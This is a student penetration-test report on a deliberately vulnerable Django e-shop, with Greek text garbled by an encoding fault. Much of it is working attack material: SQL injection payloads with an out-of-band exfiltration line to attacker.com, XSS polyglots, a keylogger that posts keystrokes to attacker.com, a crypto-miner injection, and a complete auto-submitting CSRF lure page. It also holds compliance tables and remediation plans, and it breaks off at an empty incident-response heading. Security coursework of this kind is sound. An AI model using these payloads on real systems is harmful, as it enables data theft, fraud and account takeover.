# Î‘Î½Î±Î»Ï…Ï„Î¹ÎºÎ® Î¤ÎµÏ‡Î½Î¹ÎºÎ® Î‘Î½Î±Ï†Î¿ÏÎ¬ Î”Î¿ÎºÎ¹Î¼ÏÎ½ Î”Î¹ÎµÎ¯ÏƒÎ´Ï…ÏƒÎ·Ï‚ - Î•Ï†Î±ÏÎ¼Î¿Î³Î® E-Shop

**Î¤Î±Î¾Î¹Î½ÏŒÎ¼Î·ÏƒÎ· Î•Î³Î³ÏÎ¬Ï†Î¿Ï…**: Î‘Ï…ÏƒÏ„Î·ÏÎ¬ Î•Î¼Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î¹ÎºÏŒ  
**ÎˆÎºÎ´Î¿ÏƒÎ· Î‘Î½Î±Ï†Î¿ÏÎ¬Ï‚**: 2.0 Enhanced  
**Î—Î¼ÎµÏÎ¿Î¼Î·Î½Î¯Î±**: [Î—ÎœÎ•Î¡ÎŸÎœÎ—ÎÎ™Î‘]  
**Î£Ï…Î½Ï„Î¬ÎºÏ„Î·Ï‚**: [ÎŸÎÎŸÎœÎ‘ Î¦ÎŸÎ™Î¤Î—Î¤Î—]  
**ÎœÎ¬Î¸Î·Î¼Î±**: CDS201 - ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚ Î•Î¹ÏƒÎ²Î¿Î»ÏÎ½ Î”Î¹ÎºÏ„ÏÏ‰Î½ ÎºÎ±Î¹ Î£Ï…ÏƒÏ„Î·Î¼Î¬Ï„Ï‰Î½  
**Î•Î¾Î¬Î¼Î·Î½Î¿**: Î•Î±ÏÎ¹Î½ÏŒ 2025  

---

## Executive Dashboard

### ğŸ¯ ÎšÏÎ¯ÏƒÎ¹Î¼Î± ÎœÎµÏ„ÏÎ¹ÎºÎ¬ Î‘ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚

| ÎœÎµÏ„ÏÎ¹ÎºÎ® | Î¤Î¹Î¼Î® | Î£Ï„ÏŒÏ‡Î¿Ï‚ | Status |
|---------|------|--------|--------|
| ÎšÏÎ¯ÏƒÎ¹Î¼ÎµÏ‚ Î•Ï…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ | 5 | 0 | ğŸ”´ Critical |
| CVSS Average Score | 8.7 | <4.0 | ğŸ”´ High Risk |
| Time to Exploit | <5 min | >24h | ğŸ”´ Immediate |
| Business Risk Score | 95/100 | <20 | ğŸ”´ Unacceptable |
| Compliance Status | 15% | 100% | ğŸ”´ Non-Compliant |

### ğŸ“Š ÎšÎ±Ï„Î±Î½Î¿Î¼Î® Î•Ï…Ï€Î±Î¸ÎµÎ¹ÏÎ½ Î±Î½Î¬ ÎšÎ±Ï„Î·Î³Î¿ÏÎ¯Î±

```
SQL Injection    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100% (Database Compromise)
Authentication   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  95% (Account Takeover)
XSS             â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ      80% (Session Hijacking)
IDOR            â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ      80% (Data Breach)
CSRF            â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ        70% (Unauthorized Actions)
```

### ğŸ’° Î•ÎºÏ„Î¹Î¼ÏÎ¼ÎµÎ½Î¿ ÎšÏŒÏƒÏ„Î¿Ï‚ Î•Ï€Î¹Ï€Ï„ÏÏƒÎµÏ‰Î½

| ÎšÎ±Ï„Î·Î³Î¿ÏÎ¯Î± | Î•Î»Î¬Ï‡Î¹ÏƒÏ„Î¿ | ÎœÎ­Î³Î¹ÏƒÏ„Î¿ | Î Î¹Î¸Î±Î½ÏŒÏ„Î·Ï„Î± |
|-----------|----------|---------|------------|
| GDPR Î ÏÏŒÏƒÏ„Î¹Î¼Î± | â‚¬500K | â‚¬20M | 90% |
| Data Breach Costs | â‚¬150K | â‚¬5M | 85% |
| Business Disruption | â‚¬100K | â‚¬2M | 70% |
| Reputation Damage | â‚¬200K | â‚¬10M | 95% |
| **Î£Î¥ÎÎŸÎ›ÎŸ** | **â‚¬950K** | **â‚¬37M** | **85%** |

---

## Î ÎµÏÎ¯Î»Î·ÏˆÎ· Î³Î¹Î± Ï„Î· Î”Î¹Î¿Î¯ÎºÎ·ÏƒÎ·

### ğŸš¨ ÎšÏÎ¯ÏƒÎ¹Î¼Î± Î•Ï…ÏÎ®Î¼Î±Ï„Î±

Î— ÎµÏ†Î±ÏÎ¼Î¿Î³Î® E-Shop Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÎµ **ÎšÎ¡Î™Î£Î™ÎœÎ— ÎšÎ‘Î¤Î‘Î£Î¤Î‘Î£Î— Î‘Î£Î¦Î‘Î›Î•Î™Î‘Î£** Î¼Îµ Î¬Î¼ÎµÏƒÎ¿ ÎºÎ¯Î½Î´Ï…Î½Î¿ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚. Î•Î½Ï„Î¿Ï€Î¯ÏƒÏ„Î·ÎºÎ±Î½ **5 ÎºÏÎ¯ÏƒÎ¹Î¼ÎµÏ‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚** Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½:

1. **Î Î»Î®ÏÎ· Î­Î»ÎµÎ³Ï‡Î¿ Ï„Î·Ï‚ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½** ÏƒÎµ <2 Î»ÎµÏ€Ï„Î¬
2. **ÎšÎ»Î¿Ï€Î® ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ credentials** Î¼Îµ automated tools
3. **Î ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ Ï€ÎµÎ»Î±Ï„ÏÎ½**
4. **Î•ÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÏÎ´Î¹ÎºÎ± ÏƒÏ„Î¿Ï…Ï‚ browsers Ï„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½**
5. **ÎœÎ· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½ÎµÏ‚ Î¿Î¹ÎºÎ¿Î½Î¿Î¼Î¹ÎºÎ­Ï‚ ÏƒÏ…Î½Î±Î»Î»Î±Î³Î­Ï‚**

### ğŸ“ˆ Î•Ï€Î¹Ï‡ÎµÎ¹ÏÎ·Î¼Î±Ï„Î¹ÎºÎ­Ï‚ Î•Ï€Î¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚

Î£ÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ Ï„Î¿ **Ponemon Institute Cost of Data Breach Report 2024**:
- ÎœÎ­ÏƒÎ¿ ÎºÏŒÏƒÏ„Î¿Ï‚ data breach: **â‚¬4.45M**
- ÎœÎ­ÏƒÎ¿Ï‚ Ï‡ÏÏŒÎ½Î¿Ï‚ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼Î¿Ï: **277 Î·Î¼Î­ÏÎµÏ‚**
- Î‘Ï€ÏÎ»ÎµÎ¹Î± Ï€ÎµÎ»Î±Ï„ÏÎ½: **35-65%**

### ğŸ¯ Î†Î¼ÎµÏƒÎµÏ‚ Î•Î½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ (24-48 ÏÏÎµÏ‚)

1. **Î‘Î Î•ÎÎ•Î¡Î“ÎŸÎ ÎŸÎ™Î—Î£Î—** Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ Î® Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼ÏŒÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚
2. **PATCH** Ï„Ï‰Î½ SQL injection ÎºÎ±Î¹ XSS ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½
3. **Î•ÎÎ•Î¡Î“ÎŸÎ ÎŸÎ™Î—Î£Î—** rate limiting ÎºÎ±Î¹ CSRF protection
4. **Î‘Î›Î›Î‘Î“Î—** ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ passwords ÎºÎ±Î¹ sessions

---

## 1. Î•Î¹ÏƒÎ±Î³Ï‰Î³Î® ÎºÎ±Î¹ Î Î»Î±Î¯ÏƒÎ¹Î¿

### 1.1 Î£ÎºÎ¿Ï€ÏŒÏ‚ ÎºÎ±Î¹ Î‘Î½Ï„Î¹ÎºÎµÎ¹Î¼ÎµÎ½Î¹ÎºÎ¿Î¯ Î£Ï„ÏŒÏ‡Î¿Î¹

Î— Ï€Î±ÏÎ¿ÏÏƒÎ± Î±Î½Î±Ï†Î¿ÏÎ¬ Î±Ï€Î¿Ï„ÎµÎ»ÎµÎ¯ Ï„Î¿ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± ÎµÎ¾Î¿Î½Ï…Ï‡Î¹ÏƒÏ„Î¹ÎºÏÎ½ Î´Î¿ÎºÎ¹Î¼ÏÎ½ Î´Î¹ÎµÎ¯ÏƒÎ´Ï…ÏƒÎ·Ï‚ ÏƒÏ„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® E-Shop, Î¼Îµ ÏƒÏ„ÏŒÏ‡Î¿Ï…Ï‚:

- **Î ÏÎ¿ÏƒÎ¿Î¼Î¿Î¯Ï‰ÏƒÎ· Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏÎ½ ÎµÏ€Î¹Î¸Î­ÏƒÎµÏ‰Î½** Î±Ï€ÏŒ motivated attackers
- **Î Î¿ÏƒÎ¿Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… ÎµÏ€Î¹Ï‡ÎµÎ¹ÏÎ·Î¼Î±Ï„Î¹ÎºÎ¿Ï ÎºÎ¹Î½Î´ÏÎ½Î¿Ï…**
- **Î Î±ÏÎ¿Ï‡Î® actionable remediation roadmap**
- **Î£Ï…Î¼Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Î¼Îµ Î´Î¹ÎµÎ¸Î½Î® Ï€ÏÏŒÏ„Ï…Ï€Î±** (ISO 27001, OWASP)

### 1.2 Threat Landscape Analysis

Î’Î¬ÏƒÎµÎ¹ Ï„Î¿Ï… **Verizon DBIR 2024** ÎºÎ±Î¹ **ENISA Threat Landscape**:

| Threat Actor | Motivation | Capability | Relevance |
|--------------|------------|------------|-----------|
| Cybercriminals | Financial | High | ğŸ”´ Critical |
| Hacktivists | Ideological | Medium | ğŸŸ¡ Medium |
| Nation States | Espionage | Very High | ğŸŸ¢ Low |
| Insiders | Various | High | ğŸŸ¡ Medium |

### 1.3 ÎœÎµÎ¸Î¿Î´Î¿Î»Î¿Î³Î¯Î± Testing

```mermaid
graph LR
    A[Reconnaissance] --> B[Scanning]
    B --> C[Enumeration]
    C --> D[Vulnerability Analysis]
    D --> E[Exploitation]
    E --> F[Post-Exploitation]
    F --> G[Reporting]
    
    style A fill:#f9f,stroke:#333,stroke-width:2px
    style E fill:#f66,stroke:#333,stroke-width:2px
    style G fill:#6f6,stroke:#333,stroke-width:2px
```

---

## 2. Î¤ÎµÏ‡Î½Î¹ÎºÎ® Î‘Î½Î¬Î»Ï…ÏƒÎ· Î•Ï…Ï€Î±Î¸ÎµÎ¹ÏÎ½

### 2.1 SQL Injection - ÎšÎ±Ï„Î±ÏƒÏ„ÏÎ¿Ï†Î¹ÎºÎ® Î•Ï…Ï€Î¬Î¸ÎµÎ¹Î±

#### 2.1.1 Î¤ÎµÏ‡Î½Î¹ÎºÎ® Î‘Î½Î¬Î»Ï…ÏƒÎ· Root Cause

**Vulnerable Code Analysis** (`eshop/views.py:366-371`):

```python
# VULNERABLE CODE - DO NOT USE IN PRODUCTION
def catalog_view(request):
    search_query = request.GET.get('q', '')
    
    # âŒ CRITICAL: Direct string concatenation
    raw_query = f"""
    SELECT * FROM eshop_product 
    WHERE name LIKE '%%{search_query}%%'
    """
    
    # âŒ CRITICAL: No parameterization
    cursor.execute(raw_query)
```

**Root Cause Chain**:
1. Î§ÏÎ®ÏƒÎ· **f-strings** Î³Î¹Î± SQL queries
2. Î‘Ï€Î¿Ï…ÏƒÎ¯Î± **parameterized queries**
3. Bypass Ï„Î¿Ï… Django ORM security layer
4. Î§ÏÎ®ÏƒÎ· **raw cursor.execute()**

#### 2.1.2 Advanced Exploitation Techniques

**[ÎŸÎ”Î—Î“Î™Î•Î£ SCREENSHOT SQL-ADV-1]**
```
Î¤Î¯Ï„Î»Î¿Ï‚: Advanced SQL Injection - Time-Based Blind
Î•ÏÎ³Î±Î»ÎµÎ¯Î¿: SQLMap Î¼Îµ custom tamper scripts
Î•Î½Ï„Î¿Î»Î®:
sqlmap -u "http://localhost:8000/catalog/?q=test" \
       --technique=T \
       --time-sec=5 \
       --tamper=space2comment,between \
       --dump-all \
       --threads=10

Screenshot Ï€Î¿Ï… Î´ÎµÎ¯Ï‡Î½ÎµÎ¹:
- Database fingerprinting (SQLite version)
- Table enumeration via time delays
- Data extraction character by character
```

**Exploitation Payload Variations**:

```sql
-- Boolean-based blind
' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)--

-- Time-based blind
' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE 1 END FROM auth_user)--

-- Union-based Î¼Îµ obfuscation
' UnIoN SeLeCt NuLl,UsErNaMe,PaSsWoRd,NuLl,NuLl,NuLl,NuLl FrOm auth_user--

-- Stacked queries
'; UPDATE auth_user SET is_superuser=1 WHERE username='attacker'--

-- Out-of-band (DNS)
' OR (SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a')))--
```

#### 2.1.3 Real-World Attack Scenario

**Attack Timeline**:
```
T+0:00 - Attacker discovers /catalog endpoint
T+0:30 - Manual ' OR '1'='1 test confirms SQLi
T+1:00 - SQLMap automated exploitation begins
T+2:30 - Database schema extracted
T+5:00 - All user credentials dumped
T+7:00 - Credit card data exfiltrated
T+10:00 - Backdoor user created
T+15:00 - Database dropped (if malicious)
```

#### 2.1.4 Business Impact Quantification

Î’Î¬ÏƒÎµÎ¹ Ï„Î¿Ï… **IBM Cost of a Data Breach Report 2024**:

| Impact Category | Cost | Calculation |
|----------------|------|-------------|
| Detection & Escalation | â‚¬150K | Forensics, consultants |
| Notification | â‚¬80K | Legal, PR, notifications |
| Post Breach Response | â‚¬200K | Credit monitoring, call center |
| Lost Business | â‚¬1.5M | Customer churn (25%) |
| Regulatory Fines | â‚¬2M | GDPR 2% annual turnover |
| **TOTAL** | **â‚¬3.93M** | Average for retail sector |

### 2.2 Cross-Site Scripting (XSS) - Advanced Exploitation

#### 2.2.1 XSS Payload Arsenal

**[ÎŸÎ”Î—Î“Î™Î•Î£ SCREENSHOT XSS-ADV-1]**
```
Î¤Î¯Ï„Î»Î¿Ï‚: Advanced XSS - Polyglot Payload
Payload: 
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

Î’Î®Î¼Î±Ï„Î±:
1. Burp Suite Repeater
2. Test ÏƒÎµ ÏŒÎ»Î± Ï„Î± input fields
3. Screenshot Ï„Î¿Ï… successful bypass
4. Show different contexts (HTML, JS, CSS)
```

**Advanced Payloads Î³Î¹Î± Î´Î¹Î¬Ï†Î¿ÏÎ± contexts**:

```javascript
// DOM-based XSS
<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))">

// AngularJS sandbox escape
{{constructor.constructor('alert(1)')()}}

// React dangerouslySetInnerHTML
{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(1)>"}}

// Mutation XSS
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// CSS injection to XSS
<style>@import'//attacker.com/xss.css';</style>
```

#### 2.2.2 Advanced Attack Scenarios

**Cryptocurrency Miner Injection**:
```javascript
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
    var miner = new CoinHive.Anonymous('SITE_KEY');
    miner.start();
</script>
```

**Keylogger Implementation**:
```javascript
<script>
var keys = [];
document.onkeypress = function(e) {
    keys.push(e.key);
    if(keys.length > 10) {
        fetch('https://attacker.com/log', {
            method: 'POST',
            body: JSON.stringify({keys: keys, url: window.location.href})
        });
        keys = [];
    }
}
</script>
```

### 2.3 Authentication Bypass - Î£Ï…ÏƒÏ„Î·Î¼Î¹ÎºÎ® Î‘Î½Î¬Î»Ï…ÏƒÎ·

#### 2.3.1 Multi-Vector Authentication Attacks

**[ÎŸÎ”Î—Î“Î™Î•Î£ SCREENSHOT AUTH-ADV-1]**
```
Î¤Î¯Ï„Î»Î¿Ï‚: Response Time Analysis Î³Î¹Î± User Enumeration
Î•ÏÎ³Î±Î»ÎµÎ¯Î¿: Custom Python script Î¼Îµ matplotlib
Î”ÎµÎ¯Î¾Ï„Îµ:
- Graph Î¼Îµ response times Î³Î¹Î± valid vs invalid users
- Statistical significance (>50ms difference)
- Automated user enumeration results
```

**Advanced Enumeration Script**:
```python
import requests
import time
import statistics
import matplotlib.pyplot as plt

def measure_response_time(username, password):
    times = []
    for _ in range(10):
        start = time.time()
        requests.post('http://localhost:8000/login/', 
                     data={'username': username, 'password': password})
        times.append((time.time() - start) * 1000)
    return statistics.mean(times)

# Test valid vs invalid users
valid_users = ['admin', 'testuser', 'victim1']
invalid_users = ['notexist1', 'notexist2', 'notexist3']

valid_times = [measure_response_time(u, 'wrong') for u in valid_users]
invalid_times = [measure_response_time(u, 'wrong') for u in invalid_users]

# Plot results
plt.figure(figsize=(10, 6))
plt.boxplot([valid_times, invalid_times], labels=['Valid Users', 'Invalid Users'])
plt.ylabel('Response Time (ms)')
plt.title('User Enumeration via Timing Attack')
plt.savefig('user_enumeration_timing.png')
```

#### 2.3.2 Password Attack Sophistication

**Intelligent Password Generation**:
```python
def generate_targeted_passwords(username, company_info):
    """Generate likely passwords based on OSINT"""
    passwords = []
    
    # Common patterns
    patterns = [
        f"{username}123",
        f"{username}2024",
        f"{company_info['name']}123",
        f"{username}@{company_info['name']}",
        "Password123!",
        "Welcome123!",
    ]
    
    # Seasonal variations
    seasons = ['Spring', 'Summer', 'Fall', 'Winter']
    years = ['2023', '2024', '2025']
    
    for season in seasons:
        for year in years:
            passwords.append(f"{season}{year}!")
    
    return passwords
```

### 2.4 IDOR - Business Logic Exploitation

#### 2.4.1 Automated IDOR Discovery

**[ÎŸÎ”Î—Î“Î™Î•Î£ SCREENSHOT IDOR-ADV-1]**
```
Î¤Î¯Ï„Î»Î¿Ï‚: IDOR Pattern Analysis Î¼Îµ Burp Intruder
Î•ÏÎ³Î±Î»ÎµÎ¯Î¿: Burp Suite Professional
Î’Î®Î¼Î±Ï„Î±:
1. Capture order request
2. Send to Intruder
3. Set payload positions: /order/Â§ORD-Â§Â§TESTÂ§Â§-Â§Â§DEMOÂ§Â§/
4. Payload type: Numbers 0-999
5. Screenshot Ï„Î¿Ï… Intruder results Î¼Îµ status codes
6. Highlight accessible orders (200 OK)
```

**IDOR Discovery Automation**:
```python
import re
import requests
from concurrent.futures import ThreadPoolExecutor

class IDORHunter:
    def __init__(self, session_cookie):
        self.session = requests.Session()
        self.session.cookies.set('sessionid', session_cookie)
        self.found_ids = []
        
    def test_pattern(self, pattern, start, end):
        """Test numeric pattern for IDOR"""
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for i in range(start, end):
                url = pattern.format(i)
                futures.append(executor.submit(self.check_access, url))
            
            for future in futures:
                result = future.result()
                if result:
                    self.found_ids.append(result)
    
    def identify_patterns(self, sample_id):
        """Identify ID patterns from sample"""
        patterns = []
        
        # Numeric patterns
        if re.match(r'^\d+$', sample_id):
            patterns.append('/order/{}/')
            
        # Alphanumeric patterns
        if re.match(r'^[A-Z]+-\d+-[A-Z]+$', sample_id):
            prefix, num, suffix = sample_id.split('-')
            patterns.append(f'/order/{prefix}-{{}}-{suffix}/')
            
        return patterns
```

### 2.5 CSRF - Î§ÏÎ·Î¼Î±Ï„Î¿Î¿Î¹ÎºÎ¿Î½Î¿Î¼Î¹ÎºÎ­Ï‚ Î•Ï€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚

#### 2.5.1 Advanced CSRF Attack Chains

**[ÎŸÎ”Î—Î“Î™Î•Î£ SCREENSHOT CSRF-ADV-1]**
```
Î¤Î¯Ï„Î»Î¿Ï‚: CSRF Attack Chain Visualization
Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ diagram Ï€Î¿Ï… Î´ÎµÎ¯Ï‡Î½ÎµÎ¹:
1. Victim logs into bank
2. Visits attacker site
3. Hidden iframe loads
4. Multiple CSRF requests fire
5. Money transferred
6. Email changed
7. Password reset requested
```

**Sophisticated CSRF Attack Page**:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Î£Ï…Î³Ï‡Î±ÏÎ·Ï„Î®ÏÎ¹Î±! ÎšÎµÏÎ´Î¯ÏƒÎ±Ï„Îµ â‚¬1000!</title>
    <style>
        body {
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            font-family: Arial;
            text-align: center;
            padding: 50px;
        }
        .prize {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        .loading {
            display: none;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="prize">
        <h1>ğŸ‰ Î£Ï…Î³Ï‡Î±ÏÎ·Ï„Î®ÏÎ¹Î±! ğŸ‰</h1>
        <h2>ÎšÎµÏÎ´Î¯ÏƒÎ±Ï„Îµ â‚¬1000 ÏƒÏ„Î¿Î½ Î´Î¹Î±Î³Ï‰Î½Î¹ÏƒÎ¼ÏŒ Î¼Î±Ï‚!</h2>
        <p>Î•Ï€ÎµÎ¾ÎµÏÎ³Î±Î¶ÏŒÎ¼Î±ÏƒÏ„Îµ Ï„Î¿ Î²ÏÎ±Î²ÎµÎ¯Î¿ ÏƒÎ±Ï‚...</p>
        <div class="loading">
            <img src="loading.gif" alt="Loading...">
            <p>Î Î±ÏÎ±ÎºÎ±Î»Ï Ï€ÎµÏÎ¹Î¼Î­Î½ÎµÏ„Îµ...</p>
        </div>
    </div>

    <!-- Hidden CSRF Attack Forms -->
    <div style="display:none">
        <!-- Transfer all funds -->
        <form id="transfer1" action="http://localhost:8000/transfer-credits/" method="POST">
            <input name="recipient" value="attacker">
            <input name="amount" value="9999.99">
        </form>
        
        <!-- Change email for account takeover -->
        <form id="email" action="http://localhost:8000/update-email/" method="POST">
            <input name="email" value="attacker@evil.com">
        </form>
        
        <!-- Add attacker as authorized user -->
        <form id="adduser" action="http://localhost:8000/add-authorized-user/" method="POST">
            <input name="username" value="attacker">
            <input name="permissions" value="full">
        </form>
        
        <!-- Change shipping address -->
        <form id="address" action="http://localhost:8000/update-address/" method="POST">
            <input name="address" value="Attacker Street 123">
            <input name="city" value="Evil City">
        </form>
    </div>

    <script>
        // Sophisticated attack chain
        async function executeAttackChain() {
            document.querySelector('.loading').style.display = 'block';
            
            // Phase 1: Financial theft
            await submitForm('transfer1', 1000);
            
            // Phase 2: Account takeover prep
            await submitForm('email', 2000);
            
            // Phase 3: Persistence
            await submitForm('adduser', 3000);
            
            // Phase 4: Data modification
            await submitForm('address', 4000);
            
            // Phase 5: Redirect to legitimate site
            setTimeout(() => {
                window.location = 'http://legitimate-site.com/congrats';
            }, 5000);
        }
        
        function submitForm(formId, delay) {
            return new Promise(resolve => {
                setTimeout(() => {
                    document.getElementById(formId).submit();
                    resolve();
                }, delay);
            });
        }
        
        // Auto-execute after page load
        window.onload = () => {
            setTimeout(executeAttackChain, 2000);
        };
        
        // Prevent back button
        history.pushState(null, null, location.href);
        window.onpopstate = function() {
            history.go(1);
        };
    </script>
</body>
</html>
```

---

## 3. Î£Ï…Î¼Î¼ÏŒÏÏ†Ï‰ÏƒÎ· ÎºÎ±Î¹ ÎšÎ±Î½Î¿Î½Î¹ÏƒÏ„Î¹ÎºÏŒ Î Î»Î±Î¯ÏƒÎ¹Î¿

### 3.1 GDPR Compliance Matrix

| Î†ÏÎ¸ÏÎ¿ GDPR | Î‘Ï€Î±Î¯Ï„Î·ÏƒÎ· | Status | Î•Ï…Ï€Î¬Î¸ÎµÎ¹Î± | Î ÏÏŒÏƒÏ„Î¹Î¼Î¿ |
|------------|----------|---------|----------|----------|
| Art. 25 | Privacy by Design | âŒ Fail | All | â‚¬10M Î® 2% |
| Art. 32 | Security of Processing | âŒ Fail | SQLi, XSS | â‚¬10M Î® 2% |
| Art. 33 | Breach Notification | âŒ Fail | No monitoring | â‚¬10M Î® 2% |
| Art. 34 | Communication to Users | âŒ Fail | No process | â‚¬10M Î® 2% |

### 3.2 PCI-DSS Requirements Gap

| Requirement | Description | Gap | Remediation |
|-------------|-------------|-----|-------------|
| 2.3 | Encrypt all admin access | âŒ HTTP allowed | Force HTTPS |
| 6.5.1 | Injection flaws | âŒ SQL Injection | Parameterized queries |
| 6.5.7 | Cross-site scripting | âŒ XSS present | Output encoding |
| 8.2.3 | Strong passwords | âŒ MD5 hashing | Argon2/bcrypt |

### 3.3 ISO 27001 Controls Assessment

```
A.9 Access Control          [â–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘] 20% - Critical failures
A.10 Cryptography          [â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘] 10% - MD5 usage
A.12 Operations Security   [â–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘] 30% - Logging missing
A.13 Communications        [â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘] 15% - No TLS enforcement
A.14 Development           [â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘]  5% - No secure SDLC
A.18 Compliance           [â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘] 20% - Multiple violations
```

---

## 4. Remediation Roadmap Î¼Îµ Timeline

### 4.1 24-Hour Emergency Response

```mermaid
gantt
    title Emergency Response Plan (First 24 Hours)
    dateFormat HH:mm
    axisFormat %H:%M
    
    section Critical
    Incident Declaration      :crit, a1, 00:00, 30m
    Disable Public Access     :crit, a2, after a1, 1h
    SQL Injection Patch       :crit, a3, after a2, 2h
    XSS Quick Fix            :crit, a4, after a2, 2h
    
    section High Priority  
    Enable Rate Limiting      :active, b1, after a3, 1h
    CSRF Protection          :active, b2, after a3, 1h
    Change All Passwords     :active, b3, after a4, 2h
    
    section Communication
    Stakeholder Notice       :c1, 00:30, 30m
    Customer Notice Prep     :c2, after b3, 2h
    Regulatory Notice        :c3, 06:00, 2h
```

### 4.2 30-Day Remediation Plan

| Week | Actions | Resources | Cost |
|------|---------|-----------|------|
| 1 | Fix Critical (SQLi, XSS, Auth) | 2 devs + security | â‚¬15K |
| 2 | Implement WAF, monitoring | DevOps + vendor | â‚¬25K |
| 3 | Code review, testing | External audit | â‚¬20K |
| 4 | Training, process updates | All team | â‚¬10K |

### 4.3 Long-term Security Program (6 months)

1. **Month 1-2**: Immediate fixes + monitoring
2. **Month 3-4**: Security architecture redesign
3. **Month 5-6**: DevSecOps implementation
4. **Ongoing**: Continuous testing and training

---

## 5. Cost-Benefit Analysis

### 5.1 Cost of Doing Nothing

| Risk | Probability | Impact | Annual Loss Expectancy |
|------|------------|--------|------------------------|
| Data Breach | 85% | â‚¬4.5M | â‚¬3.825M |
| Regulatory Fine | 90% | â‚¬2M | â‚¬1.8M |
| Reputation Loss | 95% | â‚¬1M | â‚¬950K |
| **Total ALE** | - | - | **â‚¬6.575M** |

### 5.2 Security Investment ROI

| Investment | Cost | Benefit | ROI |
|------------|------|---------|-----|
| WAF Implementation | â‚¬50K | Prevent 60% attacks | 1200% |
| Security Training | â‚¬20K | Reduce 40% vulns | 800% |
| Penetration Testing | â‚¬30K | Find critical issues | 1500% |
| DevSecOps Tools | â‚¬40K | Continuous security | 1000% |
| **Total Investment** | **â‚¬140K** | **â‚¬6.4M saved** | **4571%** |

### 5.3 3-Year TCO Comparison

```
Scenario A: No Action
Year 1: â‚¬6.5M (breach + fines)
Year 2: â‚¬2M (recovery costs)
Year 3: â‚¬1M (lost business)
Total: â‚¬9.5M

Scenario B: Security Investment
Year 1: â‚¬140K (initial)
Year 2: â‚¬60K (maintenance)
Year 3: â‚¬60K (maintenance)
Total: â‚¬260K

Savings: â‚¬9.24M (97.3% reduction)
```

---

## 6. Incident Response Playbook

